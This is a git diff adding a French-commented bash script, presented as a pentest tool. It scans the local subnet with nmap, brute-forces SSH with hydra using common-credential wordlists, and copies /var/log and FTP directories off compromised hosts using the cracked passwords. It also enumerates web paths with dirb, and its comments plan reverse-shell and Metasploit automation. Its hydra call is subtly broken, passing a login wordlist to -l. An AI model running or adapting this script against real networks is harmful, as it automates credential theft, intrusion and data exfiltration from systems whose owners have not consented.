@@ -1,0 +1,55 @@
+#!/bin/bash
+#ameliorations a faire  : automatiser un reverse shell , lier le nmap  avec un metasploit avec l'ajout des versions dans le nmap , une autre chose a faire est grace au dirb récupérer toutes les pages ou l'on peut 
+#faire une authentification et a ce moment la automatiser de la meme facon que le script avec hydra .
+# cas d'utilisation de ce script , lors d'un pentest  vous obtenez un acces réseaux ce script va automatiser le bruteforce via 2 outils , nmap et hydra , ce script est a deployer sur un pc deja configurer avec l ajout de
+# nmap , hydra , sshpass , dirb , ainsi que les worldlist de login et mdp . ce script ne fais pas de la gestion d'erreur et aucune interface avec l'humain est presente car ce n est pas le but , 
+#avec ca nous allons récupérer tous les fichiers de logs ansi que les fhichiers contenue sur un serveur ftp pour ensuite pouvoir les analyser hors du réseaux
+#
+# Fonction pour connaitre l'adresse IP  a partir d un ip a 
+get_ip_address() {
+    ip a | awk '/inet / && !/127.0.0.1/ {split($2, a, "/"); print a[1]}'
+}
+
+# Fonction pour connaitre le masque de sous-réseau a partir d un ip a 
+get_subnet_mask() {
+    ip a | awk '/inet / && !/127.0.0.1/ {split($2, a, "/"); print a[2]}'
+}
+
+# je récupére l'adresse IP et le masque de sous-réseaux 
+ip_address=$(get_ip_address)
+subnet_mask=$(get_subnet_mask)
+
+# creation de l'adresse compléte pour nmap, je pouvais faire un filtre directement avec juste le premier ip a pour avoir le cidr mais j'ai une autre idée ou j ai besoins que de l'ip et pas du masque
+cidr="$ip_address/$subnet_mask"
+
+# Scan des ports 22 80443 21 sur les adresses de mon pool
+nmap_output=$(nmap -Pn -oG - -p 21,22,80,443 $cidr | grep "/open/" | awk '{print $2}')
+
+
+# Déclaration des variables pour stocker les résultats de hydra
+login=""
+password=""
+host=""
+
+# Boucle pour effectuer une attaque de force brute avec Hydra sur les adresses où le port 22 est ouvert via 2 world list
+for ip in $nmap_output; do
+    hydra_output=$(hydra -l /usr/share/seclists/Login/Common-Credentials/500-worst-login.txt -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt ssh://$ip)
+    if [[ $hydra_output =~ \[22\]\[ssh\]\ host:\ ([^\ ]+)\ +login:\ ([^\ ]+)\ +password:\ ([^\ ]+) ]]; then
+        host="${BASH_REMATCH[1]}"
+        login="${BASH_REMATCH[2]}"
+        password="${BASH_REMATCH[3]}"
+
+        sshpass -p "$password" scp -r $login@$host:/var/log /home/guigui/log  
+
+        # Vérifier si les ports 80 ou 443 sont ouverts et trouve les url
+        if nmap -p 80,443 $host | grep -qE '80/tcp|443/tcp'; then
+            dirb_output=$(dirb http://$host:80 /usr/share/dirb/wordlists/common.txt)
+            echo "$dirb_output" > /home/guigui/dirb_output_$host.txt
+        fi
+
+        # Vérifier si le port 21  est ouvert et recopie les fichier
+        if nmap -p 21 $host | grep -q '21/tcp'; then
+            sshpass -p "$password" scp -r $login@$host:/var/ftp /home/guigui/ftp/
+        fi
+    fi
+done
